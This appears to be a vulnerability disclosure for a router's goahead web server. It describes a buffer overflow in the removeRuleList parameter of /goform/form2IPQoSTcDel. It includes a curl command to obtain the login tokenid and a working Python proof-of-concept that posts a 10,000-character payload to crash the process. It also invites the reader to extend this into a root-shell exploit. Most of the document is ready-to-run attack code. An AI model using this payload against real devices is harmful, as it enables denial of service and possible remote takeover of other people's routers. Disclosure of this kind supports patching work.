# Vulnerability Details
When the program processes parameter removeRuleList, it uses the size of the parameter string as maxlen, which will cause a buffer overflow.

As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution with carefully crafted overflow data.

# Recurring vulnerabilities and POC
We need to get the tokenid first  
<pre>
curl http://192.168.0.1/dir_login.asp | grep tokenid
</pre>
By sending delicately constructed data package as the poc above, we can cause a stack overflow error, leading to the crash of goahead process.  

<pre>
import requests

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

tokenid = 'xxx'

url = 'http://192.168.0.1/goform/form2IPQoSTcDel'

data = {
    'tokenid' : tokenid,
    'removeRuleList' : ','+'a' * 10000
}
response = requests.post(url, data=data)
response.encoding="utf-8"
info = response.text
li(url)
print(info)
</pre>

And you can write your own exp to get the root shell.
